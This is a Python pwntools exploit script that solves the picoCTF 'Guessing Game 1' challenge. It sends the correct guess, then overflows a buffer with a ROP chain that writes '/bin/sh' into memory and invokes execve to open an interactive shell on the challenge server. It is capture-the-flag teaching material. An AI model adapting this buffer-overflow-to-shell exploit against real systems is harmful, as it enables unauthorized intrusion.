# picoCTF-guessing-game-1-exploit.py
# by Aidan Wech (ahwech)
# nc jupiter.challenges.picoctf.org 39940

from pwn import *

def main():
    # connection variables
    host = "jupiter.challenges.picoctf.org"
    port = 39940

    # variables
    guess = 84                          # correct guess
    offset = 120                        # offset to win's return address
    pop_rax = 0x4163f4                  # pop rax ; ret
    pop_rdi = 0x400696                  # pop rdi ; ret
    pop_rsi = 0x410ca3                  # pop rsi ; ret
    pop_rdx_then_rsi = 0x44cc49         # pop rdx ; pop rsi ; ret
    mov_qword_ptr_rdi_rsi = 0x447d7b    # mov qword ptr [rdi], rsi ; ret
    syscall = 0x40137c                  # syscall
    write_bin_sh = 0x6baeb8             # this is an address in '.data' that we can read from and write to
    
    payload = flat(
        cyclic(offset),

        # write "/bin/sh\x00" into memory
        p64(pop_rsi),
        "/bin/sh\x00",
        p64(pop_rdi),
        p64(write_bin_sh),
        p64(mov_qword_ptr_rdi_rsi),

        # syscall
        p64(pop_rax),
        p64(0x3b),
        p64(pop_rdx_then_rsi),
        p64(0),
        p64(0),
        p64(syscall)
    )

    # connect to instance
    p = remote(host, port)

    # guess number
    p.recvuntil(b"guess?\n", timeout=1)
    p.sendline(f"{guess}".encode())

    # deliver payload
    p.recvuntil(b"Name? ", timeout=1)
    p.sendline(payload)

    # interact with shell
    p.recvuntil(b"\n\n", timeout=1)
    p.interactive()

if __name__ == "__main__":
    main()
